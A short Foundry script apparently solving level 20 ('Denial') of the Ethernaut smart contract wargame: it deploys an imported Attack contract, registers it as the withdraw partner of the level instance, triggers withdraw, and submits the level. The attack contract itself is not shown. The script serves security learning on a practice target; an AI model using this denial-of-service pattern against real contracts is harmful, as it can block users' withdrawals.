// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script, console2} from "forge-std/Script.sol";
import {IEthernaut} from "../interfaces/IEthernaut.sol";
import {Denial} from "../src/Level20.sol";
import {Attack} from "../src/Level20Attack.sol";

contract Level20 is Script {
    IEthernaut ethernaut = IEthernaut(vm.envAddress("ETHERNAUT_ADDR"));
    address me = vm.addr(vm.envUint("PRIVATE_KEY"));

    function run() public {
        Denial instance = Denial(payable(vm.envAddress("LVL20_ADDR")));
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        Attack attack = new Attack();

        instance.setWithdrawPartner(address(attack));
        instance.withdraw();

        ethernaut.submitLevelInstance(address(instance));

        vm.stopBroadcast();
    }
}
